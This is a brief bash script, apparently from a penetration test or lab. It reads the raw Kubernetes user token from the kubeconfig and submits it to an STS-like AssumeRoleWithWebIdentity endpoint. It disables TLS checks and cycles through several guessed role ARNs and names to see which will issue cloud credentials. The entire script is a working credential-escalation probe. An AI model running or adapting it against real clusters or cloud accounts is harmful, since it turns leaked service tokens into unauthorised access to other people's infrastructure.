set +e
JWT=$(kubectl config view --raw -o jsonpath='{.users[0].user.token}')
E=https://objects.keplerops.test
sts(){ echo "=== $1"; shift; curl -sSk -m 10 "$@" | head -c 1200; echo; }
enc=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' "$JWT")
sts "no rolearn" "$E/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&WebIdentityToken=$enc&RoleSessionName=probe&DurationSeconds=3600"
for r in 'arn:aws:iam::000000000000:role/fieldlink' 'arn:aws:iam::000000000000:role/workspace' 'arn:aws:iam::000000000000:role/fieldkest-workspace' 'arn:aws:iam::000000000000:role/rowan-workspace' 'fieldlink' 'workspace'; do
  re=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' "$r")
  sts "role=$r" "$E/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&WebIdentityToken=$enc&RoleSessionName=probe&DurationSeconds=3600&RoleArn=$re"
done
